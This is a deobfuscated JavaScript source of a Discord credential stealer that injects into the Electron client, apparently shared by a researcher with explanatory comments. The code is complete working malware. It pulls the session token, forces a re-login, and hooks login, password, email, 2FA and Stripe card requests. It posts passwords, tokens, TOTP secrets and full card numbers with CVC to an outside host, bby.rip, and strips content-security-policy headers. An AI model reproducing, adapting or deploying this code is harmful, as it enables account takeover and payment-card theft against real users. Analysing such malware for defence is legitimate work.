//Deobfuscated by: kem0x (xkem0x on twitter)

const fs = require("fs");
const path = require("path");
const {
    BrowserWindow,
    session
} = require("electron");
const querystring = require("querystring");

//Script to get the current token from the client
const getTokenScript = `
    for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([
        [], {
            get_require: (a, b, c) => a.exports = c
        },
        [
            ["get_require"]
        ]
    ]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([
        [Math.random()], {},
        a => {
            gg = a
        }
    ]), gg.c)
    if (gg.c.hasOwnProperty(a)) {
        let b = gg.c[a].exports;
        if (b && b.__esModule && b.default)
            for (let a in b.default) "getToken" == a && (token = b.default.getToken())
    } token;
`;

//On the first run, it infects the files and logs your discord out so you have to re-login
function FirstTime() {
    if (!fs[`existsSync`](path[`join`](__dirname, `bbystealer`))) return true;
    fs[`rmdirSync`](path[`join`](__dirname, `bbystealer`));
    const win = BrowserWindow[`getAllWindows`]()[0];
    return win["webContents"][`executeJavaScript`](`
    function LogOut() {
        (function (a) {
            const b = "string" == typeof a ? a : null;
            for (const c in gg.c)
                if (gg.c.hasOwnProperty(c)) {
                    const d = gg.c[c].exports;
                    if (d && d.__esModule && d.default && (b ? d.default[b] : a(d.default))) return
                    d.default;
                    if (d && (b ? d[b] : a(d))) return d
                } return null
        })("login").logout()
    }
    LogOut()
    `, true)[`then`](tationna => {}), false;
}

//This functions sends the data to hackers API
function SendToApi(data) {
    var win = BrowserWindow["getAllWindows"][0];

    win["webContents"]["executeJavaScript"](`
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://bby.rip/nF400I2alGDn", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${data}));
    `, true);
}

//==========================DETOUR FUNCTIONS START==========================
function ChangeEmail(pEmail, pPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
        xmlHttp.setRequestHeader("Authorization", "` + pToken + `");
        xmlHttp.send( null );
        xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                id: resJson.id,
                avatar: resJson[`avatar`],
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: pEmail,
                password: pPassword,
                token: pToken,
                type: "changedemail"
            };

        SendToApi(JSON[`stringify`](data));
    });
}

function ChangePassword(pPassword, pNewPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                avatar: resJson[`avatar`],
                id: resJson.id,
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: resJson[`email`],
                new_password: pNewPassword,
                password: pPassword,
                token: pToken,
                type: `changedpassword`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

function CreditCardAdded(pCCNum, pCvc, pExpireMonth, pExpireYear, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                id: resJson.id,
                avatar: resJson[`avatar`],
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: resJson[`email`],
                cc_num: pCCNum,
                expire_year: pExpireYear,
                expire_month: pExpireMonth,
                token: pToken,
                cvc: pCvc,
                type: `creditcard`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

function Enable2fa(pSecret, pPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                avatar: resJson[`avatar`],
                id: resJson.id,
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: resJson[`email`],
                secret: pSecret,
                password: pPassword,
                token: pToken,
                type: `enable2fa`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

function Login(pEmail, pPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win[`webContent` + "s"][`executeJavaScript`](`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                id: resJson.id,
                avatar: resJson[`avatar`],
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: pEmail,
                password: pPassword,
                token: pToken,
                type: `login`
            };
        SendToApi(JSON[`stringify`](data));
    });
}
//==========================DETOUR FUNCTIONS END--==========================


const Filter = {
    urls: [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*'
    ]
};


//Hooks to allow requests to be sent to the API, and First time setup
session[`defaultSession`][`webRequest`][`onBeforeRequest`](Filter, (details, response) => {
    if (FirstTime()) {
        details[`url`][`startsWith`](`wss://`) ? response({
            cancel: true
        }) : response({
            cancel: false
        });
    }
}), session[`defaultSession`][`webRequest`][`onHeadersReceived`]((details, response) => {
    delete details[`responseHeaders`][`content-security-policy`],
        delete details[`responseHeaders`][`content-security-policy-report-only`],
        response({
            responseHeaders: {
                ...details[`responseHeaders`],
                "Access-Control-Allow-Headers": "*"
            }
        });
});

const Filters = {
    urls: [`https://discord.com/api/v*/users/@me`,
        `https://discordapp.com/api/v*/users/@me`,
        `https://*.discord.com/api/v*/users/@me`,
        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
        `https://discordapp.com/api/v*/users/@me/mfa/totp/enable`,
        `https://*.discord.com/api/v*/users/@me/mfa/totp/enable`,
        `https://discordapp.com/api/v*/auth/login`,
        `https://discord.com/api/v*/auth/login`,
        `https://*.discord.com/api/v*/auth/login`,
        "https://api.stripe.com/v*/tokens"
    ]
};

//Hooking into the webRequest API by setting calls in the callback
session[`defaultSession`][`webRequest`]["onCompleted"](Filters, (details) => {

        //Login hook
        if (details[`url`][`endsWith`]("login")) {
            if (details[`statusCode`] == 200) {
                const data = JSON[`parse`](Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]()),
                    login = data[`login`],
                    passowrd = data[`password`],
                    win = BrowserWindow[`getAllWindows`]()[0];
                win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
                    Login(login, passowrd, token);
                });
            }
        }

        //Hook changing 2fa
        if (details[`url`][`includes`](`users/@me/mfa/totp/enable`)) {
            if (details[`statusCode`] == 200) {
                const data = JSON[`parse`](Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]()),
                    passowrd = data[`password`],
                    secret = data[`secret`],
                    win = BrowserWindow[`getAllWindows`]()[0];
                win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
                    Enable2fa(secret, passowrd, token);
                });
            }
        }

        //Hook changing password and email
        if (details[`url`][`endsWith`]("users/@me")) {
            if (details[`statusCode`] == 200 && details[`method`] == `PATCH`) {
                const data = JSON[`parse`](Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]());
                if (data[`password`] != null && data[`password`] != undefined && data[`password`] != "") {
                    if (data["new_password"] != undefined && data["new_password"] != null && data["new_password"] != "") {
                        const win = BrowserWindow[`getAllWindows`]()[0];
                        win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
                            ChangePassword(data[`password`], data["new_password"], token);
                        });
                    }
                    if (data[`email`] != null && data[`email`] != undefined && data[`email`] != "") {
                        const win = BrowserWindow[`getAllWindows`]()[0];
                        win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
                            ChangeEmail(data[`email`], data[`password`], token);
                        });
                    }
                }
            }
        }

        //Hook adding credit card
        if (details[`url`][`endsWith`](`tokens`)) {
            const win = BrowserWindow[`getAllWindows`]()[0],
                data = querystring[`parse`](decodeURIComponent(Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]()));
            win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
                CreditCardAdded(data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"], token);
            });
        }
    }), /* The uninfected file should only have this line lolol */
    module[`exports`] = require("./core.asar");